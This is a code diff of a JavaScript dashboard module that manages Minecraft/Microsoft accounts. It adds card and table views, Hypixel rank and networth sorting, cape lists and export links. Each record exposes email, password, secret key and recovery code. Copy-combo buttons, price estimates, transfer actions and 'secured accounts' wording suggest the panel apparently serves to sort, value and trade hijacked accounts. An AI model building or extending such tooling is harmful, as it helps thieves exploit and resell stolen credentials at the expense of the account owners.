@@ -1,73 +1,160 @@
-// Accounts Manager View Module
+// Accounts Manager View Module - 3D Cards & Tactical Intelligence
 const AccountsView = {
   state: {
     page: 1,
-    limit: 15,
+    limit: 12,
     search: '',
     filter: 'all',
     sort: 'time_desc',
-    scope: 'user'
+    scope: 'user',
+    viewMode: localStorage.getItem('accounts_view_mode') || 'grid',
+    metrics: { totalCount: 0, mcCount: 0, quarantineCount: 0, rankedCount: 0 }
   },
 
   async render() {
     const container = document.getElementById('view-content');
     container.innerHTML = `
-      <!-- Toolbar & Actions -->
-      <div class="card" style="margin-bottom:20px;">
-        <div class="card-body" style="padding:16px 20px;">
-          <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:14px;">
-            <div style="display:flex;flex-wrap:wrap;align-items:center;gap:10px;flex:1;max-width:600px;">
-              <div style="position:relative;flex:1;min-width:220px;">
-                <input type="text" id="acc-search-input" class="form-input" 
-                       placeholder="Search username, email, UID, recovery code..." 
-                       value="${this.state.search}"
-                       onkeydown="if(event.key==='Enter') AccountsView.onSearch()" />
-              </div>
-              <button class="btn btn-secondary" onclick="AccountsView.onSearch()">
-                <i class="fas fa-search"></i>
-              </button>
-            </div>
+      <!-- Intelligence Metrics Ribbon -->
+      <div class="accounts-metrics-ribbon" id="accounts-metrics-container">
+        <div class="metric-stat-card">
+          <div class="metric-stat-icon amber">
+            <i class="fas fa-users-viewfinder"></i>
+          </div>
+          <div class="metric-stat-info">
+            <span class="metric-stat-label">Secured Accounts</span>
+            <span class="metric-stat-val" id="metric-total-val">—</span>
+          </div>
+        </div>
 
-            <div style="display:flex;flex-wrap:wrap;align-items:center;gap:8px;">
-              <button class="btn btn-primary btn-sm" onclick="AccountsView.openAddAccountModal()">
-                <i class="fas fa-plus"></i> Add Account
-              </button>
-              <div class="dropdown" style="position:relative;display:inline-block;">
-                <button class="btn btn-secondary btn-sm" onclick="AccountsView.toggleExportDropdown()">
-                  <i class="fas fa-download"></i> Export <i class="fas fa-caret-down"></i>
-                </button>
-                <div id="export-dropdown-menu" style="display:none;position:absolute;right:0;top:100%;margin-top:4px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);box-shadow:var(--shadow-md);z-index:30;min-width:180px;">
-                  <a href="/api/accounts/export/download?format=txt&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;">Download TXT</a>
-                  <a href="/api/accounts/export/download?format=csv&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;">Download CSV</a>
-                  <a href="/api/accounts/export/download?format=json&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;">Download JSON</a>
-                  <a href="/api/accounts/export/recovery-codes?scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;">Recovery Codes Only</a>
-                </div>
-              </div>
-              <button class="btn btn-danger btn-sm" onclick="AccountsView.confirmDeleteAll()">
-                <i class="fas fa-trash-alt"></i> Delete All
-              </button>
+        <div class="metric-stat-card">
+          <div class="metric-stat-icon green">
+            <i class="fas fa-cube"></i>
+          </div>
+          <div class="metric-stat-info">
+            <span class="metric-stat-label">Minecraft Owners</span>
+            <span class="metric-stat-val" id="metric-mc-val">—</span>
+          </div>
+        </div>
+
+        <div class="metric-stat-card">
+          <div class="metric-stat-icon blue">
+            <i class="fas fa-crown"></i>
+          </div>
+          <div class="metric-stat-info">
+            <span class="metric-stat-label">Hypixel Ranked</span>
+            <span class="metric-stat-val" id="metric-ranked-val">—</span>
+          </div>
+        </div>
+
+        <div class="metric-stat-card">
+          <div class="metric-stat-icon orange">
+            <i class="fas fa-shield-virus"></i>
+          </div>
+          <div class="metric-stat-info">
+            <span class="metric-stat-label">Quarantine Vault</span>
+            <span class="metric-stat-val" id="metric-quarantine-val">—</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Command Toolbar & View Controls -->
+      <div class="accounts-toolbar">
+        <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:14px;">
+          <!-- Search Bar -->
+          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:10px;flex:1;max-width:540px;">
+            <div style="position:relative;flex:1;min-width:240px;">
+              <input type="text" id="acc-search-input" class="form-input" 
+                     placeholder="Search username, email, UID, recovery code... (/)" 
+                     value="${this.state.search}"
+                     onkeydown="if(event.key==='Enter') AccountsView.onSearch()" />
             </div>
+            <button class="btn btn-secondary" onclick="AccountsView.onSearch()" title="Search Accounts">
+              <i class="fas fa-search"></i>
+            </button>
+            ${this.state.search ? `
+              <button class="btn btn-secondary btn-sm" onclick="AccountsView.clearSearch()" title="Clear Search">
+                <i class="fas fa-times"></i>
+              </button>
+            ` : ''}
           </div>
 
-          <!-- Filters Row -->
-          <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;margin-top:14px;padding-top:14px;border-top:1px solid var(--border-color);">
-            <div style="display:flex;gap:6px;flex-wrap:wrap;">
-              <button class="btn btn-sm ${this.state.filter === 'all' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('all')">All</button>
-              <button class="btn btn-sm ${this.state.filter === 'mc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('mc')">Owns MC</button>
-              <button class="btn btn-sm ${this.state.filter === 'capes' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('capes')">Has Capes</button>
-              <button class="btn btn-sm ${this.state.filter === 'nomc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('nomc')">No MC</button>
+          <!-- Quick Action Buttons -->
+          <div style="display:flex;flex-wrap:wrap;align-items:center;gap:8px;">
+            <!-- View Mode Switcher -->
+            <div class="btn-group" style="background:rgba(255,255,255,0.04);padding:3px;border-radius:var(--radius-sm);border:1px solid var(--border-color);">
+              <button class="btn btn-sm ${this.state.viewMode === 'grid' ? 'btn-primary' : 'btn-secondary'}" 
+                      style="padding:6px 12px;font-size:0.75rem;"
+                      onclick="AccountsView.setViewMode('grid')" title="3D Cards Grid View">
+                <i class="fas fa-grip"></i> Cards
+              </button>
+              <button class="btn btn-sm ${this.state.viewMode === 'table' ? 'btn-primary' : 'btn-secondary'}" 
+                      style="padding:6px 12px;font-size:0.75rem;"
+                      onclick="AccountsView.setViewMode('table')" title="Compact Table View">
+                <i class="fas fa-list"></i> Table
+              </button>
             </div>
 
-            <div style="display:flex;align-items:center;gap:12px;">
-              ${API.isAdmin ? `
-                <label class="form-checkbox-label" style="font-size:0.8rem;padding:0;">
-                  <input type="checkbox" id="acc-scope-all" ${this.state.scope === 'all' ? 'checked' : ''} onchange="AccountsView.toggleScope(this.checked)" />
-                  Show All Users' Accounts
-                </label>
-              ` : ''}
+            <button class="btn btn-primary btn-sm" onclick="AccountsView.openAddAccountModal()">
+              <i class="fas fa-plus"></i> Add Account
+            </button>
 
-              <select class="form-select" style="width:auto;padding:5px 10px;font-size:0.78rem;" onchange="AccountsView.setSort(this.value)">
+            <!-- Export Dropdown -->
+            <div class="dropdown" style="position:relative;display:inline-block;">
+              <button class="btn btn-secondary btn-sm" onclick="AccountsView.toggleExportDropdown()">
+                <i class="fas fa-download"></i> Export <i class="fas fa-caret-down"></i>
+              </button>
+              <div id="export-dropdown-menu" style="display:none;position:absolute;right:0;top:100%;margin-top:6px;background:var(--bg-card);border:1px solid var(--border-card);border-radius:var(--radius-md);box-shadow:var(--shadow-lg);z-index:40;min-width:190px;overflow:hidden;">
+                <a href="/api/accounts/export/download?format=txt&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
+                  <i class="fas fa-file-lines" style="color:var(--primary);"></i> Download TXT
+                </a>
+                <a href="/api/accounts/export/download?format=csv&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
+                  <i class="fas fa-file-csv" style="color:#38bdf8;"></i> Download CSV
+                </a>
+                <a href="/api/accounts/export/download?format=json&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
+                  <i class="fas fa-file-code" style="color:#34d399;"></i> Download JSON
+                </a>
+                <a href="/api/accounts/export/recovery-codes?scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;border-top:1px solid var(--border-color);">
+                  <i class="fas fa-key" style="color:#fbbf24;"></i> Recovery Codes Only
+                </a>
+              </div>
+            </div>
+
+            <button class="btn btn-danger btn-sm" onclick="AccountsView.confirmDeleteAll()" title="Delete all user accounts">
+              <i class="fas fa-trash-alt"></i>
+            </button>
+          </div>
+        </div>
+
+        <!-- Filter Chips & Sorting Row -->
+        <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;margin-top:14px;padding-top:14px;border-top:1px solid var(--border-color);">
+          <div style="display:flex;gap:6px;flex-wrap:wrap;">
+            <button class="btn btn-sm ${this.state.filter === 'all' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('all')">All</button>
+            <button class="btn btn-sm ${this.state.filter === 'mc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('mc')">
+              <i class="fas fa-cube"></i> Owns MC
+            </button>
+            <button class="btn btn-sm ${this.state.filter === 'capes' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('capes')">
+              <i class="fas fa-shield"></i> Has Capes
+            </button>
+            <button class="btn btn-sm ${this.state.filter === 'nomc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('nomc')">No MC</button>
+          </div>
+
+          <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+            ${API.isAdmin ? `
+              <label class="form-checkbox-label" style="font-size:0.8rem;padding:0;">
+                <input type="checkbox" id="acc-scope-all" ${this.state.scope === 'all' ? 'checked' : ''} onchange="AccountsView.toggleScope(this.checked)" />
+                <span>All Users' Accounts</span>
+              </label>
+            ` : ''}
+
+            <div style="display:flex;align-items:center;gap:6px;">
+              <span style="font-size:0.75rem;color:var(--text-dim);font-weight:600;text-transform:uppercase;">Sort:</span>
+              <select class="form-select" style="width:auto;padding:6px 12px;font-size:0.78rem;" onchange="AccountsView.setSort(this.value)">
                 <option value="time_desc" ${this.state.sort === 'time_desc' ? 'selected' : ''}>Newest First</option>
+                <option value="networth" ${this.state.sort === 'networth' ? 'selected' : ''}>Highest Networth</option>
+                <option value="rank" ${this.state.sort === 'rank' ? 'selected' : ''}>Hypixel Rank</option>
+                <option value="bedwars_level" ${this.state.sort === 'bedwars_level' ? 'selected' : ''}>Bedwars Stars</option>
+                <option value="skyblocklvl" ${this.state.sort === 'skyblocklvl' ? 'selected' : ''}>Skyblock Level</option>
+                <option value="capes" ${this.state.sort === 'capes' ? 'selected' : ''}>Most Capes</option>
                 <option value="time_asc" ${this.state.sort === 'time_asc' ? 'selected' : ''}>Oldest First</option>
                 <option value="username_asc" ${this.state.sort === 'username_asc' ? 'selected' : ''}>Username A-Z</option>
                 <option value="username_desc" ${this.state.sort === 'username_desc' ? 'selected' : ''}>Username Z-A</option>
@@ -77,13 +164,9 @@ const AccountsView = {
         </div>
       </div>
 
-      <!-- Accounts Table Card -->
-      <div class="card">
-        <div class="card-body" style="padding:0;">
-          <div id="accounts-table-container">
-            ${App.waveDots('Loading secured accounts...', 'lg')}
-          </div>
-        </div>
+      <!-- Accounts Dynamic Viewport Container -->
+      <div id="accounts-container">
+        ${App.waveDots('Loading secured accounts...', 'lg')}
       </div>
     `;
 
@@ -91,8 +174,8 @@ const AccountsView = {
   },
 
   async loadAccounts() {
-    const tableContainer = document.getElementById('accounts-table-container');
-    if (!tableContainer) return;
+    const container = document.getElementById('accounts-container');
+    if (!container) return;
 
     try {
       const res = await API.get('/api/accounts', {
@@ -104,120 +187,372 @@ const AccountsView = {
         scope: this.state.scope
       });
 
-      const { accounts, pagination } = res.data;
+      const { accounts, pagination, metrics } = res.data;
+
+      // Update metrics ribbon
+      if (metrics) {
+        const totalEl = document.getElementById('metric-total-val');
+        const mcEl = document.getElementById('metric-mc-val');
+        const quEl = document.getElementById('metric-quarantine-val');
+        const rkEl = document.getElementById('metric-ranked-val');
+
+        if (totalEl) totalEl.textContent = metrics.totalCount || 0;
+        if (mcEl) {
+          const pct = metrics.totalCount > 0 ? Math.round((metrics.mcCount / metrics.totalCount) * 100) : 0;
+          mcEl.innerHTML = `${metrics.mcCount || 0} <span style="font-size:0.75rem;color:var(--text-dim);font-weight:400;">(${pct}%)</span>`;
+        }
+        if (quEl) quEl.textContent = metrics.quarantineCount || 0;
+        
+        // Count ranked accounts in current view
+        const rankedInBatch = accounts.filter(a => a.rank && a.rank !== 'None').length;
+        if (rkEl) rkEl.textContent = rankedInBatch;
+      }
 
       if (!accounts.length) {
-        tableContainer.innerHTML = `
-          <div style="text-align:center;padding:50px;">
-            <i class="fas fa-user-slash fa-3x" style="color:var(--text-dim);margin-bottom:14px;"></i>
-            <h4 style="color:var(--text-muted);">No accounts found</h4>
-            <p style="font-size:0.85rem;color:var(--text-dim);margin-top:4px;">Try modifying your search or filters.</p>
+        container.innerHTML = `
+          <div class="card" style="text-align:center;padding:60px 20px;">
+            <i class="fas fa-user-slash fa-3x" style="color:var(--text-dim);margin-bottom:16px;"></i>
+            <h3 style="color:#fff;font-size:1.15rem;font-weight:600;">No accounts found</h3>
+            <p style="font-size:0.85rem;color:var(--text-dim);margin-top:6px;max-width:400px;margin-left:auto;margin-right:auto;">
+              ${this.state.search ? `No accounts matched "${this.state.search}". Try clearing your search query.` : 'There are no secured accounts in this category yet.'}
+            </p>
+            ${this.state.search ? `
+              <div style="margin-top:16px;">
+                <button class="btn btn-secondary btn-sm" onclick="AccountsView.clearSearch()">Clear Search</button>
+              </div>
+            ` : ''}
           </div>
         `;
         return;
       }
 
-      tableContainer.innerHTML = `
-        <div class="table-wrapper" style="border:none;border-radius:0;">
-          <table>
-            <thead>
-              <tr>
-                <th>Minecraft User</th>
-                <th>Email Address</th>
-                <th>Recovery Code</th>
-                <th>Owns MC</th>
-                <th>Capes</th>
-                <th>Added</th>
-                <th style="text-align:right;">Actions</th>
-              </tr>
-            </thead>
-            <tbody>
-              ${accounts.map(acc => `
-                <tr>
-                  <td>
-                    <div style="display:flex;align-items:center;gap:10px;">
-                      <img src="https://visage.surgeplay.com/bust/${encodeURIComponent(acc.username)}?y=-40" 
-                           onerror="this.src='https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif'"
-                           style="width:28px;height:28px;border-radius:4px;flex-shrink:0;" />
-                      <div>
-                        <div style="font-weight:600;display:flex;align-items:center;gap:6px;">
-                          ${acc.username || 'Unknown'}
-                          ${acc.is_quarantined ? '<span class="badge-tag danger"><i class="fas fa-lock"></i> Quarantined</span>' : ''}
-                        </div>
-                        <div style="font-size:0.72rem;color:var(--text-dim);font-family:var(--font-mono);">${acc.uid}</div>
-                      </div>
-                    </div>
-                  </td>
-                  <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted);">
-                    ${acc.email}
-                  </td>
-                  <td>
-                    <button class="btn btn-secondary btn-sm" style="font-family:var(--font-mono);font-size:0.75rem;" 
-                            onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')">
-                      <i class="far fa-copy"></i> ${acc.recoverycode ? acc.recoverycode.substring(0, 11) + '...' : 'N/A'}
-                    </button>
-                  </td>
-                  <td>
-                    <span class="badge-tag ${acc.ownsmc && !acc.ownsmc.includes('Failed') ? 'success' : 'danger'}">
-                      ${acc.ownsmc || 'None'}
-                    </span>
-                  </td>
-                  <td>
-                    <span class="badge-tag ${acc.capes && acc.capes !== 'None' ? 'warning' : 'info'}">
-                      ${acc.capes || 'None'}
-                    </span>
-                  </td>
-                  <td style="font-size:0.75rem;color:var(--text-dim);white-space:nowrap;">
-                    ${acc.time ? new Date(parseInt(acc.time, 10) * 1000).toLocaleDateString() : 'N/A'}
-                  </td>
-                  <td style="text-align:right;">
-                    <div class="btn-group" style="justify-content:flex-end;">
-                      <button class="btn btn-secondary btn-sm" title="Inspect Full Account" onclick="AccountsView.inspectAccount('${acc.uid}')">
-                        <i class="fas fa-search"></i>
-                      </button>
-                      <button class="btn btn-secondary btn-sm" title="Copy Formatted Line" onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${acc.capes}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
-                        <i class="fas fa-file-alt"></i>
-                      </button>
-                      <button class="btn btn-secondary btn-sm" title="Transfer Account" onclick="AccountsView.openMoveModal('${acc.uid}')">
-                        <i class="fas fa-exchange-alt"></i>
-                      </button>
-                      <button class="btn btn-danger btn-sm" title="Delete Account" onclick="AccountsView.deleteAccount('${acc.uid}')">
-                        <i class="fas fa-trash"></i>
-                      </button>
-                    </div>
-                  </td>
-                </tr>
-              `).join('')}
-            </tbody>
-          </table>
-        </div>
+      // Render either 3D Grid or Table based on current viewMode
+      if (this.state.viewMode === 'grid') {
+        this.renderGrid(container, accounts, pagination);
+      } else {
+        this.renderTable(container, accounts, pagination);
+      }
 
-        <!-- Pagination Bar -->
-        <div style="padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-top:1px solid var(--border-color);background:rgba(0,0,0,0.15);">
-          <div style="font-size:0.8rem;color:var(--text-dim);">
-            Showing page <b>${pagination.page}</b> of <b>${pagination.totalPages || 1}</b> (${pagination.total} accounts)
-          </div>
-          <div style="display:flex;gap:6px;">
-            <button class="btn btn-secondary btn-sm" ${pagination.page <= 1 ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page - 1})">
-              Previous
-            </button>
-            <button class="btn btn-secondary btn-sm" ${pagination.page >= pagination.totalPages ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page + 1})">
-              Next
-            </button>
-          </div>
-        </div>
-      `;
     } catch (err) {
-      tableContainer.innerHTML = `
-        <div style="text-align:center;padding:30px;color:var(--danger);">
-          Error loading accounts: ${err.message}
+      container.innerHTML = `
+        <div class="card" style="text-align:center;padding:40px;color:var(--danger);">
+          <i class="fas fa-exclamation-triangle fa-2x" style="margin-bottom:10px;"></i>
+          <div>Error loading accounts: ${err.message}</div>
         </div>
       `;
     }
   },
 
+  formatCoins(num) {
+    if (!num || isNaN(num) || Number(num) === 0) return '0 Coins';
+    const n = Number(num);
+    if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B Coins';
+    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M Coins';
+    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'k Coins';
+    return n.toLocaleString() + ' Coins';
+  },
+
+  // 3D Card Grid Renderer
+  renderGrid(container, accounts, pagination) {
+    const cardsHtml = accounts.map(acc => {
+      const username = (acc.username && acc.username !== "Couldn't find!" && acc.username !== 'Unknown') ? acc.username : '';
+      const skinUrl = username 
+        ? `https://mc-heads.net/body/${encodeURIComponent(username)}/right` 
+        : 'https://mc-heads.net/body/MHF_Steve/right';
+
+      // Minecraft Status
+      const ownsMc = acc.ownsmc && !acc.ownsmc.includes('Failed') && acc.ownsmc !== 'No MC';
+      const mcBadge = ownsMc 
+        ? `<span class="badge-tag success"><i class="fas fa-check-circle"></i> ${acc.ownsmc}</span>`
+        : `<span class="badge-tag danger"><i class="fas fa-times-circle"></i> ${acc.ownsmc || 'No MC'}</span>`;
+
+      // Quarantine
+      const quarantineBadge = acc.is_quarantined
+        ? `<span class="badge-tag danger"><i class="fas fa-shield-virus"></i> Quarantined</span>`
+        : '';
+
+      // Networth calculation & display
+      let worthDisplay = '—';
+      if (acc.networth > 0) {
+        worthDisplay = this.formatCoins(acc.networth);
+      } else if (ownsMc) {
+        worthDisplay = '~$15 Base';
+      } else {
+        worthDisplay = 'Unranked';
+      }
+
+      // Hypixel Rank formatting
+      const r = (acc.rank || 'None').toUpperCase();
+      let rankHtml = '';
+      if (r === 'MVP++') {
+        rankHtml = `<span class="hypixel-rank-badge rank-mvp-plus-plus">[MVP<span class="plus">++</span>]</span>`;
+      } else if (r === 'MVP+') {
+        rankHtml = `<span class="hypixel-rank-badge rank-mvp-plus">[MVP<span class="plus">+</span>]</span>`;
+      } else if (r === 'MVP') {
+        rankHtml = `<span class="hypixel-rank-badge rank-mvp">[MVP]</span>`;
+      } else if (r === 'VIP+') {
+        rankHtml = `<span class="hypixel-rank-badge rank-vip-plus">[VIP<span class="plus">+</span>]</span>`;
+      } else if (r === 'VIP') {
+        rankHtml = `<span class="hypixel-rank-badge rank-vip">[VIP]</span>`;
+      } else {
+        rankHtml = `<span class="hypixel-rank-badge rank-none">[NON]</span>`;
+      }
+
+      // Capes Pill list
+      const capesList = acc.capesList || [];
+      const capeIcons = {
+        'migrator': '🛡️ Migrator',
+        'vanilla': '🧁 Vanilla',
+        'cherry': '🌸 Cherry',
+        '15th': '🎂 15th Anniv',
+        'tiktok': '📱 TikTok',
+        'twitch': '🟣 Twitch',
+        'minecon': '🏆 Minecon',
+        'pan': '🍳 Pan',
+        'common': '🪶 Common',
+        'founder': '⛏️ Founder'
+      };
+
+      let capesHtml = '';
+      if (capesList.length > 0) {
+        capesHtml = capesList.map(cape => {
+          const cLower = String(cape).toLowerCase();
+          const matched = Object.keys(capeIcons).find(k => cLower.includes(k));
+          const label = matched ? capeIcons[matched] : `🏷️ ${cape}`;
+          return `<span class="cape-pill">${label}</span>`;
+        }).join('');
+      } else {
+        capesHtml = `<span class="cape-pill empty"><i class="fas fa-ban"></i> No Capes</span>`;
+      }
+
+      const maskedRec = acc.recoverycode 
+        ? `${acc.recoverycode.substring(0, 11)}•••••` 
+        : 'Not recorded';
+
+      return `
+        <div class="account-card">
+          <!-- Top Badges Overlay -->
+          <div class="account-card-header">
+            <div>${mcBadge}</div>
+            <div style="display:flex;gap:4px;align-items:center;">
+              ${quarantineBadge}
+              <button class="btn btn-secondary btn-sm" style="font-size:0.7rem;padding:2px 7px;" 
+                      title="Copy combo (ign:email:pass:rec)" 
+                      onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
+                <i class="far fa-copy"></i> Combo
+              </button>
+            </div>
+          </div>
+
+          <!-- 3D Skin Stage Viewport -->
+          <div class="account-stage-3d" onclick="AccountsView.inspectAccount('${acc.uid}')" title="Click to inspect account details">
+            <img class="account-skin-3d" 
+                 src="${skinUrl}" 
+                 alt="${acc.username || 'Minecraft Skin'}"
+                 loading="lazy"
+                 onerror="this.src='https://mc-heads.net/body/MHF_Steve/right'" />
+            <div class="account-stage-pedestal"></div>
+          </div>
+
+          <!-- Content Details Directly Under 3D Skin -->
+          <div class="account-card-body">
+            <!-- Username & UID -->
+            <div class="account-user-meta">
+              <div class="account-username-title" title="${acc.username || 'Unknown'}">
+                <span>${acc.username || 'Unclaimed'}</span>
+                <button class="account-username-btn" title="Copy Username" onclick="event.stopPropagation();API.copyText('${acc.username}', 'Username')">
+                  <i class="far fa-copy"></i>
+                </button>
+              </div>
+              <span class="account-uid-tag">#${acc.uid}</span>
+            </div>
+
+            <!-- Worth & Ranks Row -->
+            <div class="account-spec-strip">
+              <div class="account-spec-chip" title="Account Networth">
+                <span class="account-spec-label">Worth</span>
+                <div class="account-spec-value worth-value">
+                  <i class="fas fa-coins" style="font-size:0.8rem;color:#f59e0b;"></i>
+                  ${worthDisplay}
+                </div>
+              </div>
+
+              <div class="account-spec-chip" title="Hypixel Network Rank">
+                <span class="account-spec-label">Hypixel Rank</span>
+                <div class="account-spec-value">
+                  ${rankHtml}
+                </div>
+              </div>
+            </div>
+
+            <!-- Capes Showcase Row -->
+            <div>
+              <div style="font-size:0.68rem;color:var(--text-dim);text-transform:uppercase;font-weight:600;letter-spacing:0.04em;margin-bottom:5px;">
+                Capes & Badges
+              </div>
+              <div class="account-capes-row">
+                ${capesHtml}
+              </div>
+            </div>
+
+            <!-- Quick Recovery Code Access -->
+            <div class="account-cred-box">
+              <div style="overflow:hidden;">
+                <div style="font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;">Recovery Code</div>
+                <div class="cred-text" title="${acc.recoverycode || ''}">${maskedRec}</div>
+              </div>
+              <button class="cred-copy-btn" title="Copy 25-digit Recovery Code" onclick="event.stopPropagation();API.copyText('${acc.recoverycode}', 'Recovery Code')">
+                <i class="far fa-copy"></i> Copy
+              </button>
+            </div>
+          </div>
+
+          <!-- Card Footer Actions -->
+          <div class="account-card-footer">
+            <button class="btn btn-secondary btn-sm" style="flex:1;" onclick="AccountsView.inspectAccount('${acc.uid}')">
+              <i class="fas fa-magnifying-glass"></i> Inspect
+            </button>
+            <button class="btn btn-secondary btn-sm" title="Transfer Account" onclick="AccountsView.openMoveModal('${acc.uid}')">
+              <i class="fas fa-exchange-alt"></i>
+            </button>
+            <button class="btn btn-danger btn-sm" title="Delete Account" onclick="AccountsView.deleteAccount('${acc.uid}')">
+              <i class="fas fa-trash"></i>
+            </button>
+          </div>
+        </div>
+      `;
+    }).join('');
+
+    container.innerHTML = `
+      <div class="accounts-grid">
+        ${cardsHtml}
+      </div>
+      ${this.renderPaginationHtml(pagination)}
+    `;
+  },
+
+  // Compact Table Renderer (Alternative view mode)
+  renderTable(container, accounts, pagination) {
+    container.innerHTML = `
+      <div class="card" style="margin-bottom:20px;">
+        <div class="card-body" style="padding:0;">
+          <div class="table-wrapper" style="border:none;border-radius:0;">
+            <table>
+              <thead>
+                <tr>
+                  <th>Player (3D)</th>
+                  <th>Worth</th>
+                  <th>Rank</th>
+                  <th>Capes</th>
+                  <th>Recovery Code</th>
+                  <th>Email</th>
+                  <th style="text-align:right;">Actions</th>
+                </tr>
+              </thead>
+              <tbody>
+                ${accounts.map(acc => {
+                  const r = (acc.rank || 'None').toUpperCase();
+                  const worth = acc.networth > 0 ? OverviewView.formatCoins(acc.networth) : (acc.ownsmc === 'Purchased' ? '~$15 Base' : '—');
+                  return `
+                    <tr>
+                      <td>
+                        <div style="display:flex;align-items:center;gap:10px;">
+                          <img src="https://mc-heads.net/avatar/${encodeURIComponent(acc.username || 'Steve')}/48" 
+                               onerror="this.src='https://mc-heads.net/avatar/MHF_Steve/48'"
+                               style="width:32px;height:32px;border-radius:6px;flex-shrink:0;border:1px solid rgba(255,255,255,0.1);" />
+                          <div>
+                            <div style="font-weight:600;display:flex;align-items:center;gap:6px;">
+                              ${acc.username || 'Unknown'}
+                              ${acc.is_quarantined ? '<span class="badge-tag danger"><i class="fas fa-lock"></i></span>' : ''}
+                            </div>
+                            <div style="font-size:0.72rem;color:var(--text-dim);font-family:var(--font-mono);">#${acc.uid}</div>
+                          </div>
+                        </div>
+                      </td>
+                      <td style="font-family:var(--font-mono);color:#fbbf24;font-weight:600;">
+                        ${worth}
+                      </td>
+                      <td>
+                        <span class="badge-tag ${r !== 'NONE' ? 'warning' : 'info'}">${r}</span>
+                      </td>
+                      <td>
+                        <span class="badge-tag ${acc.capesList && acc.capesList.length ? 'success' : 'info'}">
+                          ${acc.capesList && acc.capesList.length ? acc.capesList.join(', ') : 'None'}
+                        </span>
+                      </td>
+                      <td>
+                        <button class="btn btn-secondary btn-sm" style="font-family:var(--font-mono);font-size:0.75rem;" 
+                                onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')">
+                          <i class="far fa-copy"></i> ${acc.recoverycode ? acc.recoverycode.substring(0, 11) + '...' : 'N/A'}
+                        </button>
+                      </td>
+                      <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted);">
+                        ${acc.email}
+                      </td>
+                      <td style="text-align:right;">
+                        <div class="btn-group" style="justify-content:flex-end;">
+                          <button class="btn btn-secondary btn-sm" title="Inspect" onclick="AccountsView.inspectAccount('${acc.uid}')">
+                            <i class="fas fa-search"></i>
+                          </button>
+                          <button class="btn btn-secondary btn-sm" title="Copy Combo" onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
+                            <i class="fas fa-file-alt"></i>
+                          </button>
+                          <button class="btn btn-secondary btn-sm" title="Transfer" onclick="AccountsView.openMoveModal('${acc.uid}')">
+                            <i class="fas fa-exchange-alt"></i>
+                          </button>
+                          <button class="btn btn-danger btn-sm" title="Delete" onclick="AccountsView.deleteAccount('${acc.uid}')">
+                            <i class="fas fa-trash"></i>
+                          </button>
+                        </div>
+                      </td>
+                    </tr>
+                  `;
+                }).join('')}
+              </tbody>
+            </table>
+          </div>
+          ${this.renderPaginationHtml(pagination)}
+        </div>
+      </div>
+    `;
+  },
+
+  renderPaginationHtml(pagination) {
+    if (!pagination) return '';
+    return `
+      <div style="padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-top:1px solid var(--border-color);background:rgba(0,0,0,0.18);border-radius:0 0 var(--radius-lg) var(--radius-lg);margin-top:10px;">
+        <div style="font-size:0.8rem;color:var(--text-dim);">
+          Showing page <b>${pagination.page}</b> of <b>${pagination.totalPages || 1}</b> (${pagination.total} total accounts)
+        </div>
+        <div style="display:flex;gap:8px;">
+          <button class="btn btn-secondary btn-sm" ${pagination.page <= 1 ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page - 1})">
+            <i class="fas fa-chevron-left"></i> Previous
+          </button>
+          <button class="btn btn-secondary btn-sm" ${pagination.page >= pagination.totalPages ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page + 1})">
+            Next <i class="fas fa-chevron-right"></i>
+          </button>
+        </div>
+      </div>
+    `;
+  },
+
